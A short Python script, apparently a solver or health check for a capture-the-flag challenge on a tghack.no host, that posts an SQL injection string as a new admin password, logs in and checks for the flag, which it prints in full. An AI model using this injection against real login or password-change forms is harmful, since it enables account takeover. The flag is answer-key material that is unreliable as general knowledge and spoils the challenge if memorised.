#!/usr/bin/env python3
import sys
import requests

def post_data(endpoint, text):
    with requests.post(endpoint, data = text) as r:
        return r.text

def run_test():
    base_endpoint = ""

    if len(sys.argv) == 1:
        base_endpoint = "https://bobby.tghack.no"
    elif len(sys.argv) == 2:
        base_endpoint = sys.argv[1].rstrip("/")

    if len(base_endpoint) == 0:
        print(sys.argv[0] + " <endpoint>")
    else:
        with requests.Session() as s:
            s.get(base_endpoint + "/start")
            payload = dict()
            payload["user"] = "admin"
            payload["old_pass"] = "admin"
            payload["new_pass"] = "',user=?,pass=?;--"
            s.post(base_endpoint + "/password", data = payload)
            auth = {"user": "admin", "pass": "admin"}
            r = s.post(base_endpoint + "/login", data = auth)
            assert "TG20{bobby_knows_his_sql}" in r.text

try:
    run_test()
except (OSError, AssertionError, NameError):
    sys.exit(102)
else:
    sys.exit(101)
